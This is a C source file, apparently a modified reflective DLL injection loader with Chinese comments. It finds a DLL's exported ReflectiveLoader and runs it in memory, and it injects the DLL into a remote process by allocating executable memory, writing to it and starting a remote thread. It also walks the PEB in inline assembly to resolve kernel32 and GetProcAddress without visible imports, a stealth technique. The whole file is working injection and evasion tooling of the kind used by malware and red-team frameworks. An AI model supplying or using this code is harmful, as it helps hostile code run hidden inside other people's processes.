#include <stdio.h>
#include "LoadLibraryR.h"


char* mystrstr1(char* dest,const char* src) 
{
	char* tdest = dest;
	const char* tsrc = src;
	int i = 0;//tdest 主串的元素下标位置，从下标0开始找，可以通过变量进行设置，从其他下标开始找！
	int j = 0;//tsrc 子串的元素下标位置
	while (i <= strlen(tdest) - 1 && j <= strlen(tsrc) - 1)
	{
		if (tdest[i] == tsrc[j])//字符相等，则继续匹配下一个字符
		{
			i++;
			j++;
		}
		else//在匹配过程中发现有一个字符和子串中的不等，马上回退到 下一个要匹配的位置
		{
			i = i - j + 1;
			j = 0;
		}
	}
	//循环完了后j的值等于strlen(tsrc) 子串中的字符已经在主串中都连续匹配到了
	if (j == strlen(tsrc))
	{
		return tdest + i - strlen(tsrc);
	}
	return NULL;
}




DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{    
	WORD wIndex                          = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders         = NULL;
	
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if( dwRva < pSectionHeader[0].PointerToRawData )
        return dwRva;

    for( wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++ )
    {   
        if( dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData) )           
           return ( dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData );
    }
    
    return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
{
	UINT_PTR uiBaseAddress   = 0;
	UINT_PTR uiExportDir     = 0;
	UINT_PTR uiNameArray     = 0;
	UINT_PTR uiAddressArray  = 0;
	UINT_PTR uiNameOrdinals  = 0;
	DWORD dwCounter          = 0;

	//判断是否是X64
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// Win32
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// NT头
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	//判断是X64还是X32,基于幻字
	if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
	{
		if( dwCompiledArch != 1 )
			return 0;
	}
	else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
	{
		if( dwCompiledArch != 2 )
			return 0;
	}
	else
	{
		return 0;
	}

	// 导出表
	uiNameArray = 
		(UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	// 导出表VA
	uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );

	// 函数名数组VA
	uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );

	// 函数地址数组VA
	uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

	// 函数序号数组VA
	uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );	

	// 名字个数
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

	// 寻找导出函数ReflectiveLoader
	while( dwCounter-- )
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));

		if( mystrstr1( cpExportedFunctionName, "ReflectiveLoader" ))  //<-------
		{
			// 获取函数地址数组
			uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );	
	
			// 根据序号检索对应的地址
			uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

			//返回文件偏移
			return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
		}
		//下一个
		uiNameArray += sizeof(DWORD);
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
//===============================================================================================//
// 加载DLL
HMODULE WINAPI LoadLibraryR( LPVOID lpBuffer, DWORD dwLength )
{

	//初始化函数地址
	HMODULE hKernel32 = GetKernel32BaseAddr1();
	fnGetProcAddress g_pfnGetProcAddress =
		(fnGetProcAddress)MyGetProcAddress1();
	fnLoadLibraryA g_pfnLoadLibraryA =
		(fnLoadLibraryA)g_pfnGetProcAddress(hKernel32, "LoadLibraryA");
	pfnVirtualProtect MyVirtualProtect = 
		(pfnVirtualProtect)g_pfnGetProcAddress(hKernel32, "VirtualProtect");

	//===============================================================================

	HMODULE hResult                    = NULL;
	DWORD dwReflectiveLoaderOffset     = 0;
	DWORD dwOldProtect1                = 0;
	DWORD dwOldProtect2                = 0;
	REFLECTIVELOADER pReflectiveLoader = NULL;
	DLLMAIN pDllMain                   = NULL;

	if( lpBuffer == NULL || dwLength == 0 )
		return NULL;

	__try
	{
		//获取到处函数ReflectLoader的偏移地址
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
		if( dwReflectiveLoaderOffset != 0 )
		{
			//获取VA地址
			pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			//写入
			if( MyVirtualProtect( lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1 ) )
			{
				// 赋值
				pDllMain = (DLLMAIN)pReflectiveLoader();
				if( pDllMain != NULL )
				{
					// 调用DllMain
					if( !pDllMain( NULL, DLL_QUERY_HMODULE, &hResult ) )	
						hResult = NULL;
				}
				//恢复
				MyVirtualProtect( lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2 );
			}
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		hResult = NULL;
	}

	return hResult;
}


//远程调用ReflectiveLoader
HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter )
{

	//初始化函数地址
	HMODULE hKernel32 = GetKernel32BaseAddr1();
	fnGetProcAddress g_pfnGetProcAddress =
		(fnGetProcAddress)MyGetProcAddress1();
	fnLoadLibraryA g_pfnLoadLibraryA =
		(fnLoadLibraryA)g_pfnGetProcAddress(hKernel32, "LoadLibraryA");

	pfnVirtualAllocEx MyVirtualAllocEx = 
		(pfnVirtualAllocEx)g_pfnGetProcAddress(hKernel32, "VirtualAllocEx");
	
	pfnWriteProcessMemory MyWriteProcessMemory =
		(pfnWriteProcessMemory)g_pfnGetProcAddress(hKernel32, "WriteProcessMemory");

	pfnCreateRemoteThread MyCreateRemoteThread =
		(pfnCreateRemoteThread)g_pfnGetProcAddress(hKernel32, "CreateRemoteThread");
	
	//===========================================================================
	BOOL bSuccess                             = FALSE;
	LPVOID lpRemoteLibraryBuffer              = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread                            = NULL;
	DWORD dwReflectiveLoaderOffset            = 0;
	DWORD dwThreadId                          = 0;

	__try
	{
		do
		{

			//判断是否为空
			if( !hProcess  || !lpBuffer || !dwLength )
				break;

			// 获取flectiveLoader
			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
			if( !dwReflectiveLoaderOffset )
				break;

			//开辟空间
			lpRemoteLibraryBuffer = MyVirtualAllocEx( hProcess,
				NULL, 
				dwLength,
				MEM_RESERVE|MEM_COMMIT,
				PAGE_EXECUTE_READWRITE ); 
			if( !lpRemoteLibraryBuffer )
				break;

			// 写入
			if( !MyWriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
				break;
			
			//求得VA
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

			// 远程线程调用
			hThread = MyCreateRemoteThread( hProcess, 
				NULL, 
				1024*1024,
				lpReflectiveLoader,
				lpParameter, 
				(DWORD)NULL,
				&dwThreadId );

		} while( 0 );

	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		hThread = NULL;
	}

	return hThread;
}
//===============================================================================================//

HMODULE GetKernel32BaseAddr1()
{
	HMODULE hKernel = NULL;

	_asm
	{
		pushad
		mov eax, fs:[0x30]     //PEB
		mov eax, [eax + 0x0C]    //PEB_LDR_DATA
		mov eax, [eax + 0x0C]    //InLoadOrderModuleList1 
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x18]    //Kernel32 BaseAddr
		mov hKernel, eax
		popad
	}
	return hKernel;
}


DWORD MyGetProcAddress1()
{
	//Kernel32的基地址
	HMODULE hKernel32 = GetKernel32BaseAddr1();

	//通过导出表获取GetProcAddress的地址
	//1.获取DOS头
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(PBYTE)hKernel32;
	//2.获取NT头
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader->e_lfanew);
	//3.获取导出表的结构体指针
	PIMAGE_DATA_DIRECTORY pExportDir =
		&(pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);

	PIMAGE_EXPORT_DIRECTORY pExport =
		(PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pExportDir->VirtualAddress);
	//EAT
	PDWORD pEAT = (PDWORD)((DWORD)hKernel32 + pExport->AddressOfFunctions);
	//ENT
	PDWORD pENT = (PDWORD)((DWORD)hKernel32 + pExport->AddressOfNames);
	//EIT
	PWORD pEIT = (PWORD)((DWORD)hKernel32 + pExport->AddressOfNameOrdinals);

	//4.遍历导出表，获取GetProcAddress()函数地址
	DWORD dwNumofFun = pExport->NumberOfFunctions;
	DWORD dwNumofName = pExport->NumberOfNames;
	for (DWORD i = 0; i < dwNumofFun; i++)
	{
		//如果为无效函数，跳过
		if (pEAT[i] == NULL)
			continue;
		//判断是以函数名导出还是以序号导出
		DWORD j = 0;
		for (; j < dwNumofName; j++)
		{
			if (i == pEIT[j])
			{
				break;
			}
		}
		if (j != dwNumofName)
		{
			char* ExpFunName = (CHAR*)((PBYTE)hKernel32 + pENT[j]);
			//进行对比,如果正确返回地址
			if (MyStrcmp1(ExpFunName, "GetProcAddress"))
			{
				return pEAT[i] + pNtHeader->OptionalHeader.ImageBase;
			}
		}
	}
	return 0;
}

BOOL MyStrcmp1(char* src, const char*dst)
{
	BOOL ret = TRUE;
	while (!(ret = *(unsigned char *)src - *(unsigned char *)dst) && *dst)
		++src, ++dst;
	if (ret < 0)
		ret = FALSE;
	else if (ret > 0)
		ret = FALSE;
	else if (ret == 0)
		ret = TRUE;
	return ret;
}